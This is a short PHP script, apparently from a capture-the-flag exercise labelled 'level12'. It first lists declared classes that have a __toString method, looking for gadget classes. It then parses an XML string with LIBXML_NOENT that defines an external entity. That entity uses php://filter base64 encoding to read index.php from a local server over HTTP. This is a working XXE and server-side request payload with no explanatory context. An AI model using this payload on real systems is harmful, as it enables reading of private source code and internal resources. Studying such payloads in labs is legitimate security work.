<?php


$declared_classes = get_declared_classes();

foreach ($declared_classes as $cls){
    if(method_exists($cls, '__toString'))
    {
        echo "FOUND: " . $cls. "\n";
    }
}

echo new SimpleXMLElement("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php'> ]> <a>&xxe;</a>", LIBXML_NOENT);
